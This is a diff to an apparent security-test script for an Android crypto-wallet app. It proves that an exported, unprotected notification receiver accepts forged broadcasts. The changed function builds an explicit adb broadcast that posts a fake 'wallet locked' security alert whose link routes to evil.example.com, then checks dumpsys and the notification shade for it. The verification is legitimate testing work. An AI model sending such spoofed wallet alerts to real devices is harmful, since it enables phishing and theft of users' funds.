@@ -561,40 +561,68 @@ def t7_negatives():
                  f"validator_moved_screen={moved} resumed={r2[:150]}", ui_ok=True)
 
 def t12_broadcast_injection():
-    """r11 hypothesis, statically proven first (manifest + decompiled classes11):
-    exported LocalNotificationAlarmReceiver, action
-    com.defi.core.mediator.START_NOTIFICATION_ALARM, NO android:permission.
-    onReceive() reads header/body/routerUrl straight from any sender's intent
-    (no getSendingPackage check) -> b.b() -> background path builds the wallet
-    launch intent, M.setData(Uri.parse(routerUrl)) and posts the notification
-    with attacker title/body (WalletNotificationHelper.c).
-    Dynamic proof needed: spoofed wallet notification readable in the shade
-    (XML = the working evidence channel on ATD); tap routing is observational
-    (logcat 'intent in NotificationPush' + dumpsys). Pre-login by design."""
-    home(); time.sleep(6)   # background => system-notification path in b.b()
-    sh("adb shell dumpsys notification > %s/notif_before.txt 2>/dev/null" % OUT, 40)
-    o = sh("adb shell \"am broadcast -a com.defi.core.mediator.START_NOTIFICATION_ALARM "
-           "--es header 'URGENT: Wallet security alert' "
-           "--es body 'Your wallet is temporarily locked. Tap to restore access.' "
-           "--es routerUrl 'dfw://dapp/detail?dappUrl=https://evil.example.com' "
-           "--ei notificationId 4242\"", 40)
-    log(f"T12 broadcast out: {' '.join(o.split())[:250]}")
+    """r11 lesson: the plain implicit am broadcast was BLOCKED by Android 8+
+    ('Background execution not allowed' — component/package were null). The
+    real attacker model is a malicious app calling setComponent() on this
+    EXPORTED, permission-less receiver, which IS allowed for background
+    manifest receivers -> r12 sends EXPLICIT (-n).
+    Evidence chain = observational (ui_ok=True): our unique attack text inside
+    dumpsys NotificationRecord proves receiver execution + notification post;
+    shade/in-app UI text is bonus proof (spoof_ui). Fallback variant B retries
+    while the wallet is foregrounded (b.b in-app path)."""
+    BC = ("adb shell \"am broadcast"
+          " -n com.defi.wallet/com.defi.core.mediator.notification.LocalNotificationAlarmReceiver"
+          " -a com.defi.core.mediator.START_NOTIFICATION_ALARM"
+          " --es header 'URGENT: Wallet security alert'"
+          " --es body 'Your wallet is temporarily locked. Tap to restore access.'"
+          " --es routerUrl 'dfw://dapp/detail?dappUrl=https://evil.example.com'"
+          " --ei notificationId 4242\"")
+
+    def snap(tag):
+        sh("adb shell \"dumpsys notification --noredact 2>/dev/null || dumpsys notification\""
+           " > " + OUT + "/notif_" + tag + ".txt", 40)
+        h = sh("grep -c 'URGENT: Wallet security alert' " + OUT + "/notif_" + tag + ".txt"
+               " 2>/dev/null || true", 20)
+        try:
+            return int(" ".join(h.split()).splitlines()[-1])
+        except Exception:
+            return 0
+
+    # --- variant A: wallet in background => b.b takes the notification path
+    home(); time.sleep(6)
+    snap("before")
+    o = sh(BC, 40)
+    log(f"T12 broadcast(explicit) out: {' '.join(o.split())[:250]}")
     time.sleep(SLEEP)
-    sh("adb shell dumpsys notification > %s/notif_after.txt 2>/dev/null" % OUT, 40)
-    lc = sh("adb shell \"logcat -d -t 500 | grep -i LocalNotificationAlarmReceiver\"", 40)
-    log(f"T12 receiver log: {' '.join(lc.split())[:300]}")
-    # pull the shade and read it through the working channel (uiautomator XML)
-    sh("adb shell cmd statusbar expand-notifications", 20)
+    nA = snap("after")
+    recv = sh("adb shell \"logcat -d -t 700 | grep -i LocalNotificationAlarmReceiver\"", 40)
+    log(f"T12 receiver log: {' '.join(recv.split())[:350]}")
+    so = sh("adb shell cmd statusbar expand-notifications", 20)
+    log(f"T12 shade expand: {' '.join(so.split())[:150]}")
     time.sleep(8)
     x = dump("t12_shade")
     t = txt(x)
-    spoof = any(k in t.lower() for k in ("wallet security alert", "restore access"))
-    hits = sh("grep -c \"URGENT: Wallet security alert\" %s/notif_after.txt 2>/dev/null || true" % OUT, 20)
-    sh("adb shell cmd statusbar collapse", 20)
-    time.sleep(4)
-    verdict_line("T12_exported_receiver_spoofed_notification", spoof,
-                 f"shade_ui={t[:300]} dumpsys_hit_lines={' '.join(hits.split())[:30]} "
-                 f"receiver_log={' '.join(lc.split())[:200]}")
+    spoof_ui = any(k in t.lower() for k in ("wallet security alert", "restore access"))
+    sh("adb shell cmd statusbar collapse", 20); time.sleep(4)
+
+    nB = 0; t2 = ""
+    if nA == 0 and not spoof_ui:
+        log("T12 bg path blocked -> variant B: wallet FOREGROUND, same explicit broadcast")
+        ensure_wallet_fg("t12fg")
+        o2 = sh(BC, 40)
+        log(f"T12 broadcast(fg) out: {' '.join(o2.split())[:250]}")
+        time.sleep(SLEEP)
+        nB = snap("after_fg")
+        x2 = dump("t12_fg")
+        t2 = txt(x2)
+        if any(k in t2.lower() for k in ("wallet security alert", "restore access")):
+            spoof_ui = True
+
+    ok = ((nA + nB) > 0) or spoof_ui
+    verdict_line("T12_exported_receiver_spoofed_notification", ok,
+                 f"dumpsys_hits bg={nA} fg={nB} spoof_ui={spoof_ui} "
+                 f"shade_ui={t[:180]} fg_ui={t2[:150]} recv={' '.join(recv.split())[:220]}",
+                 ui_ok=True)
 
 # ---------------------------------------------------------------- main
 def main():
